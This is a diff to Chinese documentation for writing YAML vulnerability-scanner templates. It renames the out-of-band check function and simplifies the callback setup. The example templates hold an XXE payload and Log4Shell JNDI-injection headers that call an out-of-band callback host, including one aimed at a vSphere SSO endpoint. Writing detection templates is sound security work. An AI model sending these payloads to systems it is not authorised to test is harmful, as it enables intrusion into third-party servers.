@@ -421,7 +421,7 @@ expression: (response.status == 200 && response.body.bcontains(b"SUCCESS")) || (
 
 ### 内置函数与使用限制
 依据源码与官方约定：
-- 常用函数：`randomLowercase`, `randomInt`, `base64`, `base64Decode`, `urlencode`, `urldecode`, `md5`, `hexdecode`, `toUpper`, `toLower`, `substr`, `replaceAll`, `printable`, `faviconHash`, `versionCompare`, `ysoserial`, `aesCBC`, `repeat`, `decimal`, `length`, `timestamp_second`, `year`, `shortyear`, `month`, `day`, `oobCheck`, `wait`, `jndi`, `sleep`
+- 常用函数：`randomLowercase`, `randomInt`, `base64`, `base64Decode`, `urlencode`, `urldecode`, `md5`, `hexdecode`, `toUpper`, `toLower`, `substr`, `replaceAll`, `printable`, `faviconHash`, `versionCompare`, `ysoserial`, `aesCBC`, `repeat`, `decimal`, `length`, `timestamp_second`, `year`, `shortyear`, `month`, `day`, `oobWait`, `wait`, `jndi`, `sleep`
 
 示例：
 ```yaml
@@ -491,10 +491,6 @@ info:
   author: your-name
   severity: high
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
-
 rules:
   r0:
     request:
@@ -505,11 +501,11 @@ rules:
       body: |
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE root [
-          <!ENTITY % remote SYSTEM "http://{{oobDNS}}">
+          <!ENTITY % remote SYSTEM "http://{{oob.DNS}}">
           %remote;
         ]>
         <root>test</root>
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+    expression: oobWait(oob, oob.ProtocolDNS, 3)
 
 expression: r0()
 ```
@@ -522,18 +518,14 @@ info:
   author: your-name
   severity: critical
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
-
 rules:
   r0:
     request:
       method: GET
       path: /
       headers:
-        X-Forwarded-For: "${jndi:ldap://{{oobDNS}}}"
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}}"
+    expression: oobWait(oob, oob.ProtocolDNS, 3)
 
 expression: r0()
 ```
@@ -769,18 +761,14 @@ info:
   author: your-name
   severity: critical
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
-
 rules:
   r0:
     request:
       method: GET
       path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
       headers:
-        X-Forwarded-For: "${jndi:ldap://{{oobDNS}}}"
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}}"
+    expression: oobWait(oob, oob.ProtocolDNS, 3)
 
 expression: r0()
 ```
@@ -802,7 +790,7 @@ expression: r0()
 ### 内置函数清单（常用）
 - 编码与转换：`base64`, `base64Decode`, `urlencode`, `urldecode`, `md5`, `hexdecode`, `toUpper`, `toLower`, `substr`, `replaceAll`, `printable`, `faviconHash`, `decimal`, `length`
 - 随机与时间：`randomLowercase`, `randomInt`, `timestamp_second`, `year`, `shortyear`, `month`, `day`, `sleep`, `wait`, `repeat`
-- 安全与协议：`versionCompare`, `ysoserial`, `aesCBC`, `jndi`, `oobCheck`
+- 安全与协议：`versionCompare`, `ysoserial`, `aesCBC`, `jndi`, `oobWait`
 
 
 ### 常见问题与最佳实践
@@ -816,7 +804,7 @@ expression: r0()
   expression: response.headers["server"] != "" && response.headers["server"].icontains("server")
   ```
 - OOB 交互：
-  - `oob()`, `oob.DNS`, `oob.HTTP`, `oobCheck(oob, protocol, timeout)` 的组合
+  - `{{oob.DNS}}` / `{{oob.HTTP}}` + `oobWait(oob, protocol, timeout)`（无需 `set: oob: oob()`）
 - 正则转义：
   - 在 YAML 字符串中需双反斜杠 `\\` 表示单个反斜杠
 - 与官方一致的术语：
